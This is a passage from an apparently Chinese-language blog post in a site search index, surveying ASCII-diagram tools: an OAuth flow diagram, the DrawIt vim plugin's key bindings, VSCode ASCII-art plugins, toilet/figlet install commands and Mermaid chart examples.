class="token operator">|</span>    <span class="token number">1</span>.Resource Owner    <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span>  <span class="token punctuation">(</span>B<span class="token punctuation">)</span> Authorizatoin Grant     <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">&lt;</span>--------------------------- <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span>                              +------------------------+<span class="token operator">|</span>        <span class="token operator">|</span>  <span class="token punctuation">(</span>C<span class="token punctuation">)</span> Authorizatoin Request   +------------------------+<span class="token operator">|</span>        <span class="token operator">|</span> ---------------------------<span class="token operator">></span> <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span> Client <span class="token operator">|</span>                              <span class="token operator">|</span> <span class="token number">2</span>.Authorizatoin Server <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span>  <span class="token punctuation">(</span>D<span class="token punctuation">)</span> Access Token            <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">&lt;</span>--------------------------- <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span>                              +------------------------+<span class="token operator">|</span>        <span class="token operator">|</span>  <span class="token punctuation">(</span>E<span class="token punctuation">)</span> Access Token            +------------------------+<span class="token operator">|</span>        <span class="token operator">|</span> ---------------------------<span class="token operator">></span> <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span>                              <span class="token operator">|</span>   <span class="token number">3</span>.Resource Server    <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span>  <span class="token punctuation">(</span>F<span class="token punctuation">)</span> Protected Resource      <span class="token operator">|</span>                        <span class="token operator">|</span><span class="token operator">|</span>        <span class="token operator">|</span> <span class="token operator">&lt;</span>--------------------------- <span class="token operator">|</span>                        <span class="token operator">|</span>+--------+                              +------------------------+</code></pre></div></figure><h2 id="Drawit"><a href="#Drawit" class="headerlink" title="Drawit"></a><a href="https://github.com/vim-scripts/DrawIt">Drawit</a></h2><p>vim 插件，可以绘制 ASCII 图形</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><code>\di</code> 进入 drawit 模式，<code>\ds</code> 退出</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><table><thead><tr><th>按键和指令</th><th>作用</th></tr></thead><tbody><tr><td>left</td><td>向左绘制</td></tr><tr><td>right</td><td>向右绘制</td></tr><tr><td>up</td><td>向上绘制</td></tr><tr><td>down</td><td>向下绘制</td></tr><tr><td>h</td><td>左移动</td></tr><tr><td>j</td><td>下移动</td></tr><tr><td>k</td><td>上</td></tr><tr><td>l</td><td>右</td></tr><tr><td>space</td><td>橡皮擦模式</td></tr><tr><td>PD</td><td>右下绘制</td></tr><tr><td>PU</td><td>左下绘制</td></tr><tr><td>HOME</td><td>左上绘制</td></tr><tr><td>END</td><td>右上绘制</td></tr><tr><td>v, &lt;, &gt;, ^</td><td>四个箭头</td></tr><tr><td>\v, \&lt;, \&gt;, ^</td><td>四个粗箭头</td></tr><tr><td>crtl+v &#x2F; 鼠标拖动</td><td>进入 visible 模式</td></tr><tr><td>\l</td><td>在 visible 模式下，对选择块画线</td></tr><tr><td>\a</td><td>呈上，画带箭头的线</td></tr><tr><td>\b</td><td>对选择块画盒子</td></tr><tr><td>\e</td><td>对选择块画椭圆</td></tr><tr><td>\f 字符</td><td>以字符填充光标区域</td></tr><tr><td>\r 字符</td><td>以字符填充选择块填充</td></tr></tbody></table><h2 id="Convert-To-ASCII-Art"><a href="#Convert-To-ASCII-Art" class="headerlink" title="Convert To ASCII Art"></a>Convert To ASCII Art</h2><p>VSCode 插件，能够将字符转换成 ASCII 大图</p><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash">The cakeis a lie<span class="token operator">!</span>████████╗██╗  ██╗███████╗     ██████╗ █████╗ ██╗  ██╗███████╗╚══██╔══╝██║  ██║██╔════╝    ██╔════╝██╔══██╗██║ ██╔╝██╔════╝   ██║   ███████║█████╗      ██║     ███████║█████╔╝ █████╗   ██║   ██╔══██║██╔══╝      ██║     ██╔══██║██╔═██╗ ██╔══╝   ██║   ██║  ██║███████╗    ╚██████╗██║  ██║██║  ██╗███████╗   ╚═╝   ╚═╝  ╚═╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝██╗███████╗     █████╗     ██╗     ██╗███████╗██╗██║██╔════╝    ██╔══██╗    ██║     ██║██╔════╝██║██║███████╗    ███████║    ██║     ██║█████╗  ██║██║╚════██║    ██╔══██║    ██║     ██║██╔══╝  ╚═╝██║███████║    ██║  ██║    ███████╗██║███████╗██╗╚═╝╚══════╝    ╚═╝  ╚═╝    ╚══════╝╚═╝╚══════╝╚═╝</code></pre></div></figure><h2 id="toilet-or-figlet"><a href="#toilet-or-figlet" class="headerlink" title="toilet or figlet"></a>toilet or figlet</h2><p>可以将普通的文本转换成各种艺术字</p><h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><figure><div class="code-wrapper"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 这里只演示 Archlinux，其他系统请查看官网</span><span class="token function">sudo</span> pacman <span class="token parameter variable">-S</span> toilet<span class="token function">sudo</span> pacman <span class="token parameter variable">-S</span> figlet</code></pre></div></figure><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><p><img src="/../img/ascii_example.jpg"></p><h2 id="Asciiflow2"><a href="#Asciiflow2" class="headerlink" title="Asciiflow2"></a>Asciiflow2</h2><p>VSCode 插件，能够在 VSCode 里面使用鼠标绘制 ASCII 图形</p><h2 id="Mermaid"><a href="#Mermaid" class="headerlink" title="Mermaid"></a><a href="https://mermaid.js.org/">Mermaid</a></h2><p>Mermaid 不能生成 ASCII 图片，但也是一个好用的文本渲染图片工具，配合 AI 使用非常方便。</p><pre><code class="mermaid">gantt    dateFormat MM-DD    title 软件开发甘特图    section 设计    需求: done,des1, 01-06,01-08    原型: active,  des2, 01-09, 3d    UI 设计: des3, after des2, 5d    未来任务: des4, after des3, 5d    section 开发    学习准备理解需求: crit, done, 01-06,24h    设计框架: crit, done, after des2, 2d    开发: crit, active, 3d    未来任务: crit, 5d    休息: 2d    section 测试    功能测试: active, a1, after des3, 3d    压力测试: after a1  , 20h    测试报告: 48h</code></pre><pre><code class="mermaid">graph TB         subgraph one         a1-->a2         end         subgraph two         b1-->b2         end         subgraph three         c1-->c2         end         c1-->a2</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在程序语言里面有很多内置模块能够将对象用 ASCII 字符体现出来，比如 python-tabulate，相对自己写输出来说也要直观不少，在以前哪个年代，纯 ASCII 字符绘制的图形也是挺炫酷的。</p><div class="note note-primary">            <p>参考文章 <a href="https://www.digglife.net/articles/ascii-flowchart-how-to.html">如何制作纯 ASCII 文本流程图</a></p>          </div>]]></content>
    
    
    <categories>
      
      <category>Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Markdwon</tag>
      
      <tag>Programming</tag>
      
      <tag>VSCode 插件</tag>
      
      <tag>绘图</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
